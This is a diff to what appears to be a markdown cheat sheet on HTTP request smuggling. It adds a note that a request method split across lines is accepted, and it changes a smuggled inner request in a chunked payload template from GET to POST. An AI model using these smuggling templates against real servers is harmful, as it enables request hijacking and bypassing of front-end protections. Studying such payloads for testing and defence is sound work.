@@ -4,6 +4,14 @@
 
 **Note: Always append two lines (`\r\n\r\n`) after Null chunk**
 **Note: Each line (`\r\n`) is 2 bytes long**
+**Note: Request does not care if method is on new lines :**
+```
+P
+O
+S
+T / HTTP/1.1
+```
+
 ## Headers
 ```
 Transfer-Encoding: chunked
@@ -61,7 +69,7 @@ Content-Length: <2 + LENGTH HEX>
 Transfer-Encoding: chunked
 
 <HEX LENGTH OF BODY>
-GET /404 HTTP/1.1
+POST /404 HTTP/1.1
 Host: <HOST>
 Content-Type: application/x-www-form-urlencoded
 Content-Length: <11 + LEN ENTIRE NEXT REQUEST>
